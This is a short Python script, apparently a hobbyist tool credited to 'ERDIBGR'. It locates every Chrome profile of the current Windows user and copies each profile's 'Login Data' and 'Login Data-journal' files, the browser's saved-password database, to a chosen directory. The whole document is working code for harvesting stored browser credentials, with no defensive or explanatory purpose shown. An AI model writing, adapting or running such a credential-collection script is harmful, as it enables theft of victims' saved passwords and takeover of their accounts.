"""
'########::'####:'########:'########::'#######::
 ##.... ##:. ##::..... ##::..... ##::'##.... ##:
 ##:::: ##:: ##:::::: ##::::::: ##::: ##:::: ##:
 ##:::: ##:: ##   CREATED BY ERDIBGR  ##:::: ##:
 ##:::: ##:: ##:::: ##::::::: ##::::: ##:::: ##:
 ##:::: ##:: ##::: ##::::::: ##:::::: ##:::: ##:
 ########::'####: ########: ########:. #######::
........:::....::........::........:::.......:::

"""
import os
import getpass
from shutil import copyfile
dnames = []
j = 1
username = getpass.getuser()
source = 'C:\\Users\\'+username+'\\AppData\\Local\\Google\\Chrome\\User Data\\'
target = 'The File Will Be Copied To Which Directory?'
if(os.path.exists(source+"Default")):
    dnames.append("Default")
for x in os.listdir(source):
    if(x[:7] == "Profile"):
        dnames.append(x)
for gir in dnames:
    copyfile(source + "\\" + gir + "\\Login Data",target + "Login Data "+ str(j))
    copyfile(source + "\\" + gir + "\\Login Data-journal",target + "Login Data-journal "+ str(j))
    j = j + 1
